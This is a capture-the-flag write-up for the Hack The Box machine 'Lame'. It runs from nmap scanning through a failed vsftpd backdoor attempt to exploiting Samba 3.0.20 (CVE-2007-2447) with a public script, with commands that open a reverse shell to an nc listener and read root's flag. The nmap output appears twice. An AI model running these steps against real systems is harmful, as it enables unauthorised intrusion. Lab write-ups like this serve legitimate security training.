# Lame

_SAMBA
_Penetration Tester Level 1
_Network
_Vulnerability Assessment
_Common Services
_Outdated Software
_Security Tools
_Metasploit
_Remote Code Execution

## Scanning

### Ping

First we ping the machine to check that we have access to it.

```
ping 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=55.1 ms
```

With the ping we can see that we the machine is recheable.
We can have some info about ttl=63.
This ttl means that we are in fton of a linux machine (ttl of linux is 64)

### Nmap

nmap -sC -sV -Pn -o nmap.txt 10.10.10.3

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-12-07T09:08:07-05:00PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-12-07T09:08:07-05:00
|_clock-skew: mean: 2h30m27s, deviation: 3h32m08s, median: 26s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m27s, deviation: 3h32m08s, median: 26s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

We can see next avalible services:
- Ftp on port 21, vsFTPd 2.3.4, and anonymous login allowed.
- Ssh on port 22, OpenSSH 4.7p1 Debian 8ubuntu1 
- Samba (139 and 445), version 3.0.20-Debian

## Gaining System Access

#### vsFTPd 2.3.4

We search for an exploit for this service with searchsploit.

```
$ searchsploit vsftpd 2.3.4

----------------------------
 ExploitTitle                                   |  Path
---------------------------
vsftpd 2.3.4 - Backdoor Command Execution       | unix/remote/49757.py
```

Now we locate where the file is.
First  ```sudo updatedb.plocate```  if never used locate.

Then we locate the file:

```
$ locate unix/remote/49757.py
/usr/share/exploitdb/exploits/unix/remote/49757.py
```

We copy the file to workign directory and we try it.
```
$ python3 49757.py 10.10.10.3 
```

Looks like is not working.

### OpenSSH 4.7p 

```
$ searchsploit openssh 4.7 
```

No results gives us command Execution.

### Samba 3.0.20

```
$ searchsploit samba 3.0.20


------------------------------------------------------------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb

```

In this case the script is .rb which means is a script for metasploit.
Let's search a script that don't use metasploit.

With a litle search we can identify the vulnerability with CVE-2007-2447.
We search exploits for it and we finded some github.

https://github.com/amriunix/CVE-2007-2447

Usage:

$ python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

We check our ip with 

```
$ ip address

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet **10.10.16.2**/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:4::1000/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::1707:69fa:8c1f:bfef/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

```

And we put a port listening:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
```

We are ready to launch the exploit.

```
$ python usermap_script.py 10.10.10.3 139 10.10.16.2 4444

```

When launched, a session is opened on our netcat that was listening.

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 48391
```

## Escalating Privileges

At this moment we have access to a sesion on the lame machine.

We run a whoami to know what user we are.
```
$ whoami
root
```
Looks like we are root, so we don't need to scale privileges.

Moving to /home we can see a makis user.

```
$ cd /home
$ ls
ftp
makis
service
user
pwd
$ cd makis
$ ls
user.txt
$ cat user.txt
```

In othe hand we move to /root and we can see the root flag too.

```
$ cd /root
$ ls
Desktop
reset_logs.sh
root.txt
$ cat root.txt
```